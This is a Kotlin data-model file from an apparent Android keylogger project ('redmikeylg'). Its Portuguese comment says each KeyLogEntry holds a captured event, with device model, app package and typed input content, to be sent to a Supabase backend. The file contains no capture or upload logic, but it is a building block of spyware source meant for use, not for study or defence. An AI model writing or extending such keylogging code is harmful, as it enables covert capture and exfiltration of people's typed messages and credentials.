package com.seuempresa.redmikeylg.data

import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable

/**
 * Representa um registro individual de evento capturado para envio ao Supabase.
 */
@Serializable
data class KeyLogEntry(
    @SerialName("device_model")
    val deviceModel: String,

    @SerialName("app_package")
    val appPackage: String,

    @SerialName("input_content")
    val inputContent: String,

    @SerialName("api_key")
    val apiKey: String
)
